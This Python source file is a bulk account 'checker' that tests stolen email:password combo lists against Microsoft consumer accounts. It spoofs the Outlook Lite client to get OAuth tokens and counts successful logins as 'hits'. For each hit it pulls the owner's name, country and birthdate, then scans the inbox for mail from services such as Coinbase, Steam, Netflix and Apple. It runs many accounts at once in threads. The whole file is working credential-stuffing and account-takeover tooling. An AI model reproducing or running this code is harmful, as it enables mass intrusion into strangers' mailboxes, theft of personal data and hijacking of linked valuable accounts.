"""
Microsoft Inbox AIO Scanner — Python
IDP check → OAuth authorize → Login → Token → Profile → Inbox scan
Services matched by sender email address in bulk message data
"""
import re
import json
import time
import uuid
import requests
import urllib.parse
import threading

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
MAX_RETRIES = 3
RETRY_DELAY = 2

# ── Service definitions (sender email → service name) ──
SERVICES = {
    "noreply@microsoft.com": "Microsoft",
    "no_reply@email.apple.com": "Apple",
    "noreply@email.apple.com": "Apple2",
    "no-reply@icloud.com": "iCloud",
    "Azure-noreply@microsoft.com": "Azure",
    "noreply@mail.accounts.riotgames.com": "Riot",
    "konami-info@konami.net": "Konami",
    "noreply@id.supercell.com": "Supercell",
    "newsletter@service.tiktok.com": "TikTok",
    "no-reply@mail.instagram.com": "Instagram",
    "mail.instagram.com": "Instagram",
    "notifications-noreply@linkedin.com": "LinkedIn",
    "fortnite@epicgames.com": "Fortnite",
    "reply@txn-email.playstation.com": "PlayStation",
    "no-reply@coinbase.com": "Coinbase",
    "noreply@steampowered.com": "Steam",
    "info@account.netflix.com": "Netflix",
    "noreply@pubgmobile.com": "PUBG",
    "security@facebookmail.com": "Facebook",
    "callofduty@comms.activision.com": "COD",
    "notification@facebookmail.com": "Facebook",
    "no-reply@spotify.com": "Spotify",
    "no_reply@snapchat.com": "Snapchat",
    "hello@mail.crunchyroll.com": "Crunchyroll",
    "no-reply@accounts.google.com": "Google",
    "account-update@amazon.com": "Amazon",
    "no-reply@epicgames.com": "Epic",
    "notifications@twitter.com": "Twitter",
    "noreply@twitch.tv": "Twitch",
    "email@discord.com": "Discord",
    "info@trendyolmail.com": "Trendyol",
    "noreply@zara.com": "Zara",
    "no-reply@itemsatis.com": "itemsatis",
    "noreply@hesap.com.tr": "hesapcomtr",
    "noreply@roblox.com": "Roblox",
    "noreply@ea.com": "EA",
    "account@nintendo.com": "Nintendo",
    "noreply@tlauncher.org": "TLauncher",
    "no-reply@pokemon.com": "Pokemon",
    "noreply@pokemon.com": "Pokemon",
    "no-reply@soundcloud.com": "SoundCloud",
    "noreply@dazn.com": "DAZN",
    "disneyplus@mail.disneyplus.com": "DisneyPlus",
    "no-reply@disneyplus.com": "DisneyPlus",
    "alerts@pornhub.com": "Pornhub",
    "noreply@pornhub.com": "Pornhub",
    "noreply@pandabuy.com": "PandaBuy",
    "no-reply@pandabuy.com": "PandaBuy",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Minecraft",
    "ebay@ebay.com": "eBay",
    "noreply@ebay.com": "eBay",
    "starplus@mail.starplus.com": "StarPlus",
    "no-reply@starplus.com": "StarPlus",
    "noreply@eldorado.gg": "Eldorado.gg",
    "no-reply@eldorado.gg": "Eldorado.gg",
    "support@eldorado.gg": "Eldorado.gg",
    "info@eldorado.gg": "Eldorado.gg",
    "notifications@eldorado.gg": "Eldorado.gg",
    "hello@eldorado.gg": "Eldorado.gg",
    "orders@eldorado.gg": "Eldorado.gg",
    "mail@eldorado.gg": "Eldorado.gg",
    "eldorado.gg": "Eldorado.gg",
}


# ── Helpers ──

def _parse_lr(text, left, right):
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except (ValueError, IndexError):
        return ""


def _parse_country(data):
    if not data or not isinstance(data, dict):
        return ""
    if isinstance(data.get("accounts"), list):
        for acc in data["accounts"]:
            if acc and acc.get("location"):
                return str(acc["location"]).strip()
    loc = data.get("location")
    if isinstance(loc, str):
        parts = loc.split(",")
        return parts[-1].strip() if parts else ""
    if isinstance(loc, dict):
        for k in ("country", "countryOrRegion", "countryCode", "Country"):
            if loc.get(k):
                return str(loc[k])
    for k in ("country", "countryOrRegion", "countryCode", "Country", "homeLocation"):
        v = data.get(k)
        if isinstance(v, str) and v:
            return v
        if isinstance(v, dict) and v.get("country"):
            return str(v["country"])
    return ""


def _parse_name(data):
    if not data or not isinstance(data, dict):
        return ""
    for k in ("displayName", "name", "givenName", "fullName", "DisplayName"):
        if data.get(k):
            return str(data[k])
    return ""


def _extract_subjects(json_text):
    subjects = []
    try:
        data = json.loads(json_text)
        if isinstance(data.get("value"), list):
            for msg in data["value"]:
                if isinstance(msg, dict):
                    subj = msg.get("subject") or msg.get("Subject")
                    if isinstance(subj, str) and subj.strip():
                        subjects.append(subj.strip())
        if not data.get("value"):
            _find_subjects(data, subjects)
    except Exception:
        pass
    return subjects


def _find_subjects(obj, out):
    if not obj or not isinstance(obj, (dict, list)):
        return
    if isinstance(obj, list):
        for item in obj:
            _find_subjects(item, out)
    else:
        for k in ("Subject", "subject"):
            if isinstance(obj.get(k), str) and obj[k].strip():
                out.append(obj[k].strip())
        for v in obj.values():
            _find_subjects(v, out)


def _count_services(all_text, all_json_list, services):
    found = {}
    lower = all_text.lower()

    # Group email patterns by service name
    svc_patterns = {}
    for email, name in services.items():
        svc_patterns.setdefault(name, []).append(email.lower())

    for svc_name, patterns in svc_patterns.items():
        max_count = 0
        svc_subjects = []

        for pat in patterns:
            count = lower.count(pat)
            domain = pat.split("@")[1] if "@" in pat else pat
            domain_count = lower.count(domain)
            max_count = max(max_count, count, domain_count)

            for jt in all_json_list:
                jl = jt.lower()
                if pat in jl or domain in jl:
                    svc_subjects.extend(_extract_subjects(jt))

        if max_count > 0:
            seen = set()
            unique = []
            for s in svc_subjects:
                if s and s not in seen:
                    seen.add(s)
                    unique.append(s)
            found[svc_name] = {
                "count": max_count,
                "subjects": unique[:10],
            }

    return found


# ── Cookie-aware session with manual redirect following ──

class CookieSession:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        })

    def get(self, url, **kwargs):
        return self.session.get(url, **kwargs)

    def post(self, url, **kwargs):
        return self.session.post(url, **kwargs)

    def get_cookie(self, name):
        return self.session.cookies.get(name, "")


# ── Single account check (mirrors Node.js attemptCheck) ──

def _attempt_check(email, password):
    result = {
        "user": email, "password": password, "status": "fail",
        "captures": {}, "services": {}, "detail": "",
        "country": "", "name": "", "birthdate": "",
    }

    cs = CookieSession()
    uid = str(uuid.uuid4())

    try:
        # ── Step 1: IDP check ──
        idp_url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={urllib.parse.quote(email)}"
        idp_resp = cs.get(idp_url, headers={
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": uid,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }, timeout=15)
        idp_text = idp_resp.text

        if any(x in idp_text for x in ("Neither", "Both", "Placeholder", "OrgId")):
            result["detail"] = "IDP check failed"
            return result
        if "MSAccount" not in idp_text:
            result["detail"] = "not MSAccount"
            return result

        # ── Step 2: OAuth authorize (microsoftonline) ──
        time.sleep(0.5)
        auth_url = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={urllib.parse.quote(email)}&mkt=en"
            f"&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        auth_resp = cs.get(auth_url, allow_redirects=True, timeout=15)
        auth_body = auth_resp.text
        auth_final_url = str(auth_resp.url)

        # Extract PPFT + urlPost
        ppft = ""
        for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"\\]+)', r'name="PPFT"[^>]*value="([^"]+)"', r"sFT:'([^']+)'"]:
            m = re.search(pat, auth_body)
            if m:
                ppft = m.group(1)
                break

        post_url = ""
        for pat in [r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
            m = re.search(pat, auth_body)
            if m:
                post_url = m.group(1).replace("\\/", "/")
                break

        if not ppft or not post_url:
            result["detail"] = "PPFT/urlPost not found"
            return result

        # ── Step 3: Login POST (no redirect follow) ──
        login_data = (
            f"i13=1&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={urllib.parse.quote(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={urllib.parse.quote(ppft)}"
            f"&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            f"&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )

        login_resp = cs.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": auth_final_url,
        }, allow_redirects=False, timeout=15)

        login_body = login_resp.text
        location = login_resp.headers.get("Location", "")

        # Check failures
        if "account or password is incorrect" in login_body or "doesn't exist" in login_body.replace("\\'", "'"):
            result["detail"] = "bad credentials"
            return result
        if "identity/confirm" in login_body:
            result["detail"] = "identity confirm"
            return result
        if "Abuse" in login_body:
            result["detail"] = "abuse/locked"
            return result

        if not location:
            result["detail"] = "no redirect location"
            return result

        code_m = re.search(r'code=([^&]+)', location)
        if not code_m:
            result["detail"] = "auth code not found"
            return result
        auth_code = code_m.group(1)

        # Get CID
        cid = cs.get_cookie("MSPCID") or ""
        if not cid:
            result["detail"] = "CID not found"
            return result
        cid = cid.upper()

        # ── Step 4: Exchange code for token ──
        token_data = (
            f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            f"&grant_type=authorization_code&code={urllib.parse.quote(auth_code)}"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        )

        token_resp = cs.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
        token_text = token_resp.text

        if "access_token" not in token_text:
            result["detail"] = "token exchange failed"
            return result

        try:
            token_json = json.loads(token_text)
        except Exception:
            result["detail"] = "token parse failed"
            return result

        access_token = token_json.get("access_token", "")
        if not access_token:
            result["detail"] = "no access_token"
            return result

        result["status"] = "hit"

        # ── Step 5: Profile information ──
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }

        country = ""
        name = ""
        birthdate = ""

        # 5a: V1Profile
        try:
            prof_resp = cs.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=profile_headers, timeout=15,
            )
            if prof_resp.status_code == 200:
                profile = prof_resp.json()
                country = _parse_country(profile)
                name = _parse_name(profile)
                bd = profile.get("birthDay")
                bm = profile.get("birthMonth")
                by = profile.get("birthYear")
                if bd:
                    birthdate = f"{bd}-{bm}-{by}"
        except Exception:
            pass

        # 5b: Graph API fallback
        if not country:
            try:
                graph_resp = cs.get(
                    "https://graph.microsoft.com/v1.0/me",
                    headers=profile_headers, timeout=15,
                )
                if graph_resp.status_code == 200:
                    gd = graph_resp.json()
                    if not country:
                        country = _parse_country(gd)
                    if not name:
                        name = _parse_name(gd)
            except Exception:
                pass

        result["country"] = country
        result["name"] = name
        result["birthdate"] = birthdate

        # ── Step 6: Inbox data — Multiple sources ──
        all_text = ""
        all_json = []

        # 6a: StartupData
        try:
            startup_headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": str(uuid.uuid4()),
                "x-req-source": "Mini",
                "authorization": f"Bearer {access_token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
                "action": "StartupData",
                "x-owa-correlationid": str(uuid.uuid4()),
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
            }
            sr = requests.post(
                f"https://outlook.live.com/owa/{urllib.parse.quote(email)}/startupdata.ashx?app=Mini&n=0",
                data="", headers=startup_headers, timeout=30,
            )
            if sr.status_code == 200:
                txt = sr.text
                all_text += txt.lower() + " "
                all_json.append(txt)
        except Exception:
            pass

        # 6b: Graph API Messages
        try:
            gm_resp = requests.get(
                "https://graph.microsoft.com/v1.0/me/messages?$top=200&$select=from,subject",
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Accept": "application/json",
                    "User-Agent": "Mozilla/5.0",
                }, timeout=30,
            )
            if gm_resp.status_code == 200:
                txt = gm_resp.text
                all_text += txt.lower() + " "
                all_json.append(txt)
        except Exception:
            pass

        # 6c: Office365 API Messages
        try:
            of_resp = requests.get(
                "https://outlook.office.com/api/v2.0/me/messages?$top=200&$select=From,Subject",
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Accept": "application/json",
                    "User-Agent": "Outlook-Android/2.0",
                    "X-AnchorMailbox": f"CID:{cid}",
                }, timeout=30,
            )
            if of_resp.status_code == 200:
                txt = of_resp.text
                all_text += txt.lower() + " "
                all_json.append(txt)
        except Exception:
            pass

        # ── Step 7: Count services ──
        found_services = _count_services(all_text, all_json, SERVICES)
        result["services"] = found_services

        if not found_services:
            result["status"] = "fail"
            result["detail"] = "no services found"

    except Exception as ex:
        err = str(ex).lower()
        if "timed out" in err or "timeout" in err:
            result["status"] = "retry"
            result["detail"] = "timed out"
        elif "connection" in err:
            result["status"] = "retry"
            result["detail"] = "connection error"
        else:
            result["status"] = "fail"
            result["detail"] = str(ex)[:100]

    return result


# ── Single account with retries ──

def check_single_account(email, password):
    result = None
    for attempt in range(MAX_RETRIES):
        result = _attempt_check(email, password)
        if result["status"] == "retry":
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            result["status"] = "fail"
            result["detail"] = f"retry exhausted ({result['detail']})"
        return result
    return result


# ── Batch checker ──

def check_inbox_accounts(accounts, threads=5, on_progress=None, stop_event=None):
    results = []
    lock = threading.Lock()
    idx = [0]
    hit_count = [0]
    fail_count = [0]

    def worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with lock:
                i = idx[0]
                idx[0] += 1
            if i >= len(accounts):
                break
            combo = accounts[i]
            parts = combo.split(":", 1)
            if len(parts) < 2 or not parts[0].strip() or not parts[1].strip():
                r = {
                    "user": parts[0].strip() if parts else combo, "password": "",
                    "status": "fail", "captures": {}, "services": {},
                    "detail": "invalid format", "country": "", "name": "", "birthdate": "",
                }
                with lock:
                    results.append(r)
                    fail_count[0] += 1
                if on_progress:
                    on_progress(len(results), len(accounts), r["status"], hit_count[0], fail_count[0], r)
                continue

            email = parts[0].strip()
            pw = parts[1].strip()
            r = check_single_account(email, pw)
            with lock:
                results.append(r)
                if r["status"] == "hit":
                    hit_count[0] += 1
                else:
                    fail_count[0] += 1
            if on_progress:
                try:
                    on_progress(len(results), len(accounts), r["status"], hit_count[0], fail_count[0], r)
                except Exception:
                    try:
                        on_progress(len(results), len(accounts))
                    except Exception:
                        pass

    concurrency = min(threads, 50, len(accounts))
    workers = []
    for _ in range(concurrency):
        t = threading.Thread(target=worker)
        t.start()
        workers.append(t)
    for t in workers:
        t.join()
    return results


def get_service_list():
    return [{"email": e, "name": n} for e, n in SERVICES.items()]


def get_service_count():
    return len(set(SERVICES.values()))
